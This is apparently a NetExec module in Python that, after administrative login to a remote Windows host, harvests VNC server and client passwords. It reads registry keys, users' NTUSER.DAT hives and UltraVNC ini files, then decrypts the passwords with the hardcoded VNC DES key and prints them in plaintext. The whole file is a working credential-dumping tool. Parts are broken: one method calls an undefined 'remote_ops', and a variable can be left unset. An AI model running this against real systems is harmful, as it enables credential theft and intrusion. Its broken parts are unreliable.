import ntpath
import tempfile

from impacket.dcerpc.v5 import rrp
from impacket import winregistry
from impacket.examples.secretsdump import RemoteOperations
from impacket.system_errors import ERROR_NO_MORE_ITEMS

from Cryptodome.Cipher import DES
from binascii import unhexlify
import codecs
import re
from nxc.helpers.misc import CATEGORY


class NXCModule:
    """
    Loot VNC Passwords
    Module by @_zblurx
    """

    name = "vnc"
    description = "Loot Passwords from VNC server and client configurations"
    supported_protocols = ["smb","wmi","winrm"]
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self, context=None, module_options=None):
        self.context = context
        self.module_options = module_options
        self.vnc_decryption_key = b"\xe8\x4a\xd6\x60\xc4\x72\x1a\xe0"
        self.false_positive = (
            ".",
            "..",
            "desktop.ini",
            "Public",
            "Default",
            "Default User",
            "All Users",
        )

    def options(self, context, module_options):
        """NO_REMOTEOPS     Do not use RemoteRegistry. Will not dump RealVNC, ThighVNC and TigerVNC passwords. Default is False"""
        self.no_remoteops = False
        if "NO_REMOTEOPS" in module_options and "True" in module_options["NO_REMOTEOPS"]:
            self.no_remoteops = True

    def on_admin_login(self, context, connection):
        self.context = context
        self.connection = connection
        self.share = self.connection.args.share if hasattr(self.connection.args,"share") else "C$"

        dploot_conn = connection.dpapi_triage.conn

        if not self.no_remoteops:
            self.vnc_from_registry(dploot_conn)
            self.vnc_client_proxyconf_extract(dploot_conn)
        self.vnc_from_filesystem(dploot_conn)

    def reg_query_value(self, dploot_conn, path, key, hku=False):
        dploot_conn.reg_get_key_value()
        if remote_ops._RemoteOperations__rrp:
            ans = rrp.hOpenUsers(remote_ops._RemoteOperations__rrp) if hku else rrp.hOpenLocalMachine(remote_ops._RemoteOperations__rrp)
            reg_handle = ans["phKey"]
            ans = rrp.hBaseRegOpenKey(
                remote_ops._RemoteOperations__rrp,
                reg_handle,
                path,
            )
            key_handle = ans["phkResult"]
            data = None
            try:
                _, data = rrp.hBaseRegQueryValue(
                    remote_ops._RemoteOperations__rrp,
                    key_handle,
                    key,
                )
                return data
            except rrp.DCERPCSessionError as e:
                self.context.log.debug(f"Error while querying registry value for {path} {key}: {e}")

    def vnc_client_proxyconf_extract(self, dploot_conn):
        vnc_client_softwares = [
            ("RealVNC Viewer 7.x Proxy Conf", "Software\\RealVNC\\vncviewer", ["ProxyUserName", "ProxyPassword", "ProxyServer"]),
        ]
        users = self.get_users(dploot_conn)
        if dploot_conn.target.protocol != "smb":
            self.context.log.warn(f"Downloading NTUSER.DAT for offline users, will be slow")
        for user, sid in users.items():
            ntuser_dat_path = ntpath.join(f"Users\\{user}\\NTUSER.DAT")
            try:
                ntuser_dat_bytes = dploot_conn.read_file(share=self.share, path=ntuser_dat_path)
            except Exception as e:
                self.context.log.debug(f"Error while getting NTUSER.DAT file for {user}: {e}")
            for vnc_name, registry_path, registry_keys in vnc_client_softwares:
                cred = {}
                if ntuser_dat_bytes is None:
                    user_registry_path = ntpath.join(sid, registry_path)
                    try:
                        password = dploot_conn.reg_get_key_value("HKU", user_registry_path, registry_keys[1])
                        if password is None:
                            continue
                        password = password.encode().rstrip(b"\x00").decode()
                        cred["password"] = self.recover_vncpassword(unhexlify(password)).decode("latin-1")
                        cred["server"] = dploot_conn.reg_get_key_value("HKU", user_registry_path, registry_keys[2])
                        cred["user"] = dploot_conn.reg_get_key_value("HKU", user_registry_path, registry_keys[0])
                    except Exception as e:
                        if "ERROR_FILE_NOT_FOUND" not in str(e):
                            self.context.log.debug(f"Error while RegQueryValues {registry_keys} from {user_registry_path}: {e}")
                        continue
                else:
                    with tempfile.NamedTemporaryFile() as fh:
                        fh.write(ntuser_dat_bytes)
                        fh.seek(0)
                        reg = winregistry.saveRegistryParser(fh.name, isRemote=False)
                        parent_key = reg.findKey(registry_path)
                        if parent_key is None:
                            continue
                        cred["user"] = reg.getValue(ntpath.join(registry_path, registry_keys[0]))[1].decode("latin-1")
                        password = reg.getValue(ntpath.join(registry_path, registry_keys[1]))[1].decode("utf-16le").rstrip("\0").encode()
                        cred["password"] = self.recover_vncpassword(unhexlify(password)).decode("latin-1")
                        cred["server"] = reg.getValue(ntpath.join(registry_path, registry_keys[2]))[1].decode("latin-1")

                self.context.log.highlight(f"[{vnc_name}] {cred['user']}:{cred['password']}@{cred['server']}")

    def vnc_from_registry(self, dpapi_conn):
        vncs = (
            ("RealVNC 4.x", "SOFTWARE\\Wow6432Node\\RealVNC\\WinVNC4", "Password"),
            ("RealVNC 3.x", "SOFTWARE\\RealVNC\\vncserver", "Password"),
            ("RealVNC 4.x", "SOFTWARE\\RealVNC\\WinVNC4", "Password"),
            ("TightVNC", "Software\\TightVNC\\Server", "Password"),
            ("TightVNC ControlPassword", "Software\\TightVNC\\Server", "ControlPassword"),
            ("TightVNC", "Software\\TightVNC\\Server", "PasswordViewOnly"),
        )
        for vnc_name, path, key in vncs:
            value = dpapi_conn.reg_get_key_value("HKLM", path, key)
            if value is None:
                continue
            value = value.rstrip(b"\x00")
            password = self.recover_vncpassword(value)
            if password is None:
                continue
            self.context.log.highlight(f"[{vnc_name}] Password: {password.decode('latin-1')}")

        vnc_users = (
            ("RealVNC Viewer 7.x", "HKCU\\Software\\RealVNC\\vncviewer", "ProxyUserName", "ProxyPassword", "ProxyServer"),
        )
        for vnc_name, path, user, password, server in vnc_users:
            cred = {}
            try:
                value = dpapi_conn.reg_get_key_value("HKLM",path, password)
                if value is None:
                    continue
                value = value.encode().rstrip(b"\x00").decode()
                value = unhexlify(value)
            except Exception as e:
                if "ERROR_FILE_NOT_FOUND" not in str(e):
                    self.context.log.debug(f"Error while RegQueryValue {path}\\{user}: {e}")
                continue
            if value is None:
                continue
            cred["password"] = self.recover_vncpassword(value).decode()
            try:
                cred["server"] = dpapi_conn.reg_get_key_value("HKLM", path, server)
                cred["user"] = dpapi_conn.reg_get_key_value("HKLM", path, user)
            except Exception as e:
                if "ERROR_FILE_NOT_FOUND" not in str(e):
                    self.context.log.debug(f"Error while RegQueryValue {path}\\{user}: {e}")
                continue
            self.context.log.highlight(f"[{vnc_name}] {cred['user']}:{cred['password']}@{cred['server']}")

    def split_len(self, seq, length):
        return [seq[i:i + length] for i in range(0, len(seq), length)]

    def recover_vncpassword(self, cipher: bytes):
        encpasswd = cipher.hex()
        pwd = None
        if encpasswd:
            # If the hex encoded passwd length is longer than 16 hex chars and divisible
            # by 16, then we chop the passwd into blocks of 64 bits (16 hex chars)
            # (1 hex char = 4 binary bits = 1 nibble)
            hexpasswd = bytes.fromhex(encpasswd)
            if len(hexpasswd) > 16 and (len(hexpasswd) % 16) == 0:
                splitstr = self.split_len(codecs.encode(cipher, "hex"), 16)
                cryptedblocks = []
                for sblock in splitstr:
                    cryptedblocks.append(self.decrypt_password(codecs.decode(sblock, "hex")))
                    pwd = b"".join(cryptedblocks)
            elif len(hexpasswd) <= 16:
                pwd = self.decrypt_password(cipher)
            else:
                pwd = self.decrypt_password(cipher)
        return pwd

    def decrypt_password(self, password: bytes):
        length = len(password)
        try:
            if length <= 16:
                password += b"\x00" * (16 - length)
            cipher = DES.new(key=self.vnc_decryption_key, mode=DES.MODE_ECB)
            return cipher.decrypt(password)[:length]
        except Exception as ex:
            self.context.log.debug(f"Error while decrypting VNC password {password}: {ex}")

    def vnc_from_filesystem(self, dploot_conn):
        vncs = (
            ("UltraVNC", "Program Files (x86)\\uvnc bvba\\UltraVNC\\ultravnc.ini"),
            ("UltraVNC", "Program Files\\uvnc bvba\\UltraVNC\\ultravnc.ini"),
            ("UltraVNC", "Program Files\\UltraVNC\\ultravnc.ini"),
            ("UltraVNC", "Program Files (x86)\\UltraVNC\\ultravnc.ini"),
        )

        for vnc_name, filepath in vncs:
            file_content = dploot_conn.read_file(share=self.share, path=filepath)
            if file_content is not None:
                regex_passwd = [rb"passwd=[0-9A-F]+", rb"passwd2=[0-9A-F]+"]
                for regex in regex_passwd:
                    passwds_encrypted = re.findall(regex, file_content)
                    for passwd_encrypted in passwds_encrypted:
                        passwd_encrypted = passwd_encrypted.split(b"=")[-1]
                        password = self.recover_vncpassword(unhexlify(passwd_encrypted))[:8]
                        self.context.log.highlight(f"[{vnc_name}] Password: {password.decode('latin-1')}")

    def get_users(self, conn):
        users = {}
        userlist_key = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList"

        for sid in conn.reg_enum_key("HKLM",userlist_key):
            profile_path = conn.reg_get_key_value("HKLM",f"{userlist_key}\\{sid}","ProfileImagePath")
            if "C:\\Users" not in profile_path:
                continue
            users[ntpath.basename(profile_path).rstrip("\0")] = sid.rstrip("\0")

        return users
